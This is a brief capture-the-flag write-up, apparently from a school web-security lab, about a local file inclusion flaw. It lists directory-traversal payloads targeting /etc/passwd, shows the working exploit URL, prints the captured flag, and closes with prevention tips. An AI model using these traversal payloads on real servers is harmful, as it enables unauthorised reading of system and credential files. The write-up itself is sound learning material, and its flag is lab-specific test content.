# Local file inclusion
- the vulnerability occurs when a user can control, in some way, the file that the server is going to load
- the server loads a local file (e.g. etc/passwd, /var/log/syslog, /home/username/.ssh/authorized_keys)
- https://book.hacktricks.xyz/pentesting-web/file-inclusion

<b>keywords</b>: include<br>
<b>attacked site</b>: http://borntosec.42/?page=$PAGE_NAME

## Exploit
To check if the vulnerability exists, we can try several payloads:
```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```
We succeeded with the penultimate one:
``` html
http://borntosec.42/?page=../../../../../../../etc/passwd
```
Visiting this URL opens a popup window:
```
Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

## Flag
b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0

## Exploit prevention
- validate user input
- use absolute paths (specify the full path on the server)
- restrict file inclusion
